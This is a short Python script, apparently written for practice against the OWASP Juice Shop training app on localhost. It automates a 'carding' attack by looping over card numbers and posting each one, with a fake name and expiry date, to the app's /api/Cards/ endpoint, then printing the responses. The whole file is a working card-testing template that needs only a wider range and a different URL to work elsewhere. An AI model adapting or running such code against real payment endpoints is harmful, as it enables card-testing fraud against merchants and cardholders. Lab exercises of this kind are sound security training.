import requests


def carding_attack_to_juice_shop():  # get all the time good answer

    for i in range(5326102314421000, 5326102314421001):
        headers = {'User-Agent': 'Mozilla/5.0'}
        # payload = {'mat-form-field-label-19': 'Mark Zbikowski', 'mat-form-field-label-21': i, 'mat-input-7': '5',
        #           'mat-input-8': '2080'}
        payload = {'fullName': 'Mark Zbikowski', 'cardNum': i, 'expMonth': '5',
                   'expYear': '2080'}
        session = requests.Session()
        res = session.post('http://localhost:5000/api/Cards/', data=payload, headers=headers)
        print(res.text)

carding_attack_to_juice_shop()
